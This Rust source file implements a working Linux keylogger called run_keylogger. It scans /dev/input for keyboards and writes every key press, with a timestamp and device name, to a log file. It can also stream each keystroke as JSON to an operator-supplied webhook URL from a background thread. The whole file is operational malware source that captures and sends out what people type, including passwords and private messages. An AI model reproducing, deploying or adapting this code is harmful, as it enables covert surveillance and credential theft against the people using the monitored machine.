use evdev::{Device, EventType, InputEventKind, Key};
use std::fs::OpenOptions;
use std::io::Write;
use std::os::unix::io::AsRawFd;
use chrono::Local;
use nix::fcntl::{FcntlArg, OFlag};
use nix::sys::epoll::{self, EpollEvent, EpollFlags, EpollOp};
use nix::unistd;
use serde_json::json;
use std::sync::mpsc;
use std::thread;

struct KeystrokeData {
    timestamp: String,
    device: String,
    key: String,
}

pub fn run_keylogger(log_path: &str, webhook_url: Option<String>) {
    // Scan for all input devices
    let devices = evdev::enumerate()
        .collect::<Vec<_>>();

    if devices.is_empty() {
        eprintln!("No input devices found!");
        eprintln!("Make sure you have proper permissions to access /dev/input/event*");
        eprintln!("Try running with: sudo ./rust-key");
        std::process::exit(1);
    }

    // Filter for keyboard devices (including USB keyboards)
    let mut keyboards = Vec::new();
    
    for (path, device) in devices {
        // Check if device has keyboard capabilities
        // A real keyboard should support letter keys like KEY_A
        if let Some(keys) = device.supported_keys() {
            // Check if device supports basic letter keys (indicates it's a real keyboard)
            // We check for multiple letter keys across the keyboard to ensure it's a typing
            // keyboard, not just a device with a few control keys (like mice or audio controls)
            let has_letter_keys = keys.contains(Key::KEY_A) 
                && keys.contains(Key::KEY_Z)
                && keys.contains(Key::KEY_M)  // Middle of alphabet
                && keys.contains(Key::KEY_ENTER)
                && keys.contains(Key::KEY_SPACE);
            
            if has_letter_keys {
                let name = device.name().unwrap_or("Unknown");
                let phys = device.physical_path().unwrap_or("Unknown");
                
                println!("Found keyboard device:");
                println!("  Name: {}", name);
                println!("  Path: {:?}", path);
                println!("  Physical: {}", phys);
                
                // Check if it's a USB device
                if phys.contains("usb") {
                    println!("  Type: USB Keyboard");
                } else {
                    println!("  Type: Internal/Other");
                }
                println!();
                
                keyboards.push((path, name.to_string()));
            }
        }
    }

    if keyboards.is_empty() {
        eprintln!("No keyboard devices found!");
        std::process::exit(1);
    }

    println!("Monitoring {} keyboard device(s)...\n", keyboards.len());

    // Open log file
    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open(log_path)
        .expect("Failed to open log file");

    // Monitor all keyboard devices
    let mut devices_to_monitor = Vec::new();
    for (path, name) in keyboards {
        match Device::open(&path) {
            Ok(device) => {
                writeln!(file, "Monitoring device: {} ({:?})", name, path)
                    .expect("Failed to write to log file");
                devices_to_monitor.push((device, name));
            }
            Err(e) => {
                eprintln!("Failed to open device {:?}: {}", path, e);
            }
        }
    }

    if devices_to_monitor.is_empty() {
        eprintln!("Failed to open any keyboard devices!");
        eprintln!("Make sure you run this with sudo or have proper permissions.");
        std::process::exit(1);
    }

    println!("Keylogger is now active and monitoring keyboards.");
    println!("Keys will be logged to: {}", log_path);
    if webhook_url.is_some() {
        println!("Keys will also be sent to the configured webhook URL.");
    }
    println!("Press Ctrl+C to stop.\n");
    
    writeln!(file, "=== Monitoring started, waiting for key events ===")
        .expect("Failed to write to log file");
    file.flush().expect("Failed to flush log file");

    // Set up webhook worker thread if URL is provided
    let webhook_sender = webhook_url.map(|url| {
        let (tx, rx) = mpsc::sync_channel::<KeystrokeData>(100); // Buffer up to 100 keystrokes
        
        // Spawn worker thread to handle webhook requests
        thread::spawn(move || {
            // Create HTTP client once
            let client = match reqwest::blocking::Client::builder()
                .timeout(std::time::Duration::from_secs(5))
                .build() {
                Ok(c) => c,
                Err(e) => {
                    eprintln!("Failed to create HTTP client: {}", e);
                    return;
                }
            };
            
            // Process keystrokes from the channel
            while let Ok(data) = rx.recv() {
                let payload = json!({
                    "timestamp": data.timestamp,
                    "device": data.device,
                    "key": data.key
                });
                
                match client.post(&url).json(&payload).send() {
                    Ok(_) => {
                        // Successfully sent, no need to log on success
                    }
                    Err(e) => {
                        eprintln!("Failed to send to webhook: {}", e);
                    }
                }
            }
        });
        
        tx
    });

    // Create epoll instance
    let epoll_fd = epoll::epoll_create1(epoll::EpollCreateFlags::EPOLL_CLOEXEC)
        .expect("Failed to create epoll instance");

    // Set all devices to non-blocking mode and register them with epoll
    for (i, (device, _)) in devices_to_monitor.iter().enumerate() {
        let raw_fd = device.as_raw_fd();
        
        // Set non-blocking
        nix::fcntl::fcntl(raw_fd, FcntlArg::F_SETFL(OFlag::O_NONBLOCK))
            .expect("Failed to set non-blocking mode");
        
        // Register with epoll
        let mut event = EpollEvent::new(EpollFlags::EPOLLIN, i as u64);
        epoll::epoll_ctl(epoll_fd, EpollOp::EpollCtlAdd, raw_fd, Some(&mut event))
            .expect("Failed to register device with epoll");
    }

    let mut events = [EpollEvent::empty(); 10];

    // Main event loop
    loop {
        // Wait for events on any device
        match epoll::epoll_wait(epoll_fd, &mut events, -1) {
            Ok(nfds) => {
                // Process events from devices that have data
                for event in &events[..nfds] {
                    let device_idx = event.data() as usize;
                    if device_idx < devices_to_monitor.len() {
                        let (device, device_name) = &mut devices_to_monitor[device_idx];
                        
                        match device.fetch_events() {
                            Ok(event_iter) => {
                                for ev in event_iter {
                                    if ev.event_type() == EventType::KEY {
                                        if let InputEventKind::Key(key) = ev.kind() {
                                            // Only log key press events (value == 1), not releases (value == 0) or repeats (value == 2)
                                            if ev.value() == 1 {
                                                let key_str = format_key(key);
                                                let timestamp = Local::now().format("%Y-%m-%d %H:%M:%S%.3f");
                                                
                                                let log_entry = format!(
                                                    "[{}] [{}] Key: {}\n",
                                                    timestamp, device_name, key_str
                                                );
                                                
                                                // Write to file
                                                file.write_all(log_entry.as_bytes())
                                                    .expect("Failed to write to log file");
                                                file.flush().expect("Failed to flush log file");
                                                
                                                // Send to webhook if sender is available
                                                if let Some(ref sender) = webhook_sender {
                                                    let _ = sender.try_send(KeystrokeData {
                                                        timestamp: timestamp.to_string(),
                                                        device: device_name.to_string(),
                                                        key: key_str,
                                                    });
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                            Err(e) if e.kind() == std::io::ErrorKind::WouldBlock => {
                                // No more events available from this device right now
                            }
                            Err(e) => {
                                eprintln!("Error reading events from {}: {}", device_name, e);
                            }
                        }
                    }
                }
            }
            Err(e) => {
                eprintln!("Error waiting for events: {}", e);
                break;
            }
        }
    }

    // Cleanup
    let _ = unistd::close(epoll_fd);
}

fn format_key(key: Key) -> String {
    match key {
        // Letters
        Key::KEY_A => "a".to_string(),
        Key::KEY_B => "b".to_string(),
        Key::KEY_C => "c".to_string(),
        Key::KEY_D => "d".to_string(),
        Key::KEY_E => "e".to_string(),
        Key::KEY_F => "f".to_string(),
        Key::KEY_G => "g".to_string(),
        Key::KEY_H => "h".to_string(),
        Key::KEY_I => "i".to_string(),
        Key::KEY_J => "j".to_string(),
        Key::KEY_K => "k".to_string(),
        Key::KEY_L => "l".to_string(),
        Key::KEY_M => "m".to_string(),
        Key::KEY_N => "n".to_string(),
        Key::KEY_O => "o".to_string(),
        Key::KEY_P => "p".to_string(),
        Key::KEY_Q => "q".to_string(),
        Key::KEY_R => "r".to_string(),
        Key::KEY_S => "s".to_string(),
        Key::KEY_T => "t".to_string(),
        Key::KEY_U => "u".to_string(),
        Key::KEY_V => "v".to_string(),
        Key::KEY_W => "w".to_string(),
        Key::KEY_X => "x".to_string(),
        Key::KEY_Y => "y".to_string(),
        Key::KEY_Z => "z".to_string(),

        // Numbers
        Key::KEY_0 => "0".to_string(),
        Key::KEY_1 => "1".to_string(),
        Key::KEY_2 => "2".to_string(),
        Key::KEY_3 => "3".to_string(),
        Key::KEY_4 => "4".to_string(),
        Key::KEY_5 => "5".to_string(),
        Key::KEY_6 => "6".to_string(),
        Key::KEY_7 => "7".to_string(),
        Key::KEY_8 => "8".to_string(),
        Key::KEY_9 => "9".to_string(),

        // Special keys
        Key::KEY_SPACE => " ".to_string(),
        Key::KEY_ENTER => "\n[ENTER]\n".to_string(),
        Key::KEY_TAB => "\t[TAB]".to_string(),
        Key::KEY_BACKSPACE => "[BACKSPACE]".to_string(),
        Key::KEY_ESC => "[ESC]".to_string(),
        Key::KEY_LEFTSHIFT | Key::KEY_RIGHTSHIFT => "[SHIFT]".to_string(),
        Key::KEY_LEFTCTRL | Key::KEY_RIGHTCTRL => "[CTRL]".to_string(),
        Key::KEY_LEFTALT | Key::KEY_RIGHTALT => "[ALT]".to_string(),
        Key::KEY_LEFTMETA | Key::KEY_RIGHTMETA => "[META]".to_string(),
        Key::KEY_CAPSLOCK => "[CAPSLOCK]".to_string(),
        
        // Punctuation
        Key::KEY_COMMA => ",".to_string(),
        Key::KEY_DOT => ".".to_string(),
        Key::KEY_SLASH => "/".to_string(),
        Key::KEY_SEMICOLON => ";".to_string(),
        Key::KEY_APOSTROPHE => "'".to_string(),
        Key::KEY_LEFTBRACE => "[".to_string(),
        Key::KEY_RIGHTBRACE => "]".to_string(),
        Key::KEY_BACKSLASH => "\\".to_string(),
        Key::KEY_MINUS => "-".to_string(),
        Key::KEY_EQUAL => "=".to_string(),
        Key::KEY_GRAVE => "`".to_string(),

        // Arrow keys
        Key::KEY_UP => "[UP]".to_string(),
        Key::KEY_DOWN => "[DOWN]".to_string(),
        Key::KEY_LEFT => "[LEFT]".to_string(),
        Key::KEY_RIGHT => "[RIGHT]".to_string(),

        // Function keys
        Key::KEY_F1 => "[F1]".to_string(),
        Key::KEY_F2 => "[F2]".to_string(),
        Key::KEY_F3 => "[F3]".to_string(),
        Key::KEY_F4 => "[F4]".to_string(),
        Key::KEY_F5 => "[F5]".to_string(),
        Key::KEY_F6 => "[F6]".to_string(),
        Key::KEY_F7 => "[F7]".to_string(),
        Key::KEY_F8 => "[F8]".to_string(),
        Key::KEY_F9 => "[F9]".to_string(),
        Key::KEY_F10 => "[F10]".to_string(),
        Key::KEY_F11 => "[F11]".to_string(),
        Key::KEY_F12 => "[F12]".to_string(),

        // Other common keys
        Key::KEY_DELETE => "[DELETE]".to_string(),
        Key::KEY_INSERT => "[INSERT]".to_string(),
        Key::KEY_HOME => "[HOME]".to_string(),
        Key::KEY_END => "[END]".to_string(),
        Key::KEY_PAGEUP => "[PAGEUP]".to_string(),
        Key::KEY_PAGEDOWN => "[PAGEDOWN]".to_string(),

        // Default for unmapped keys
        _ => format!("[{:?}]", key),
    }
}
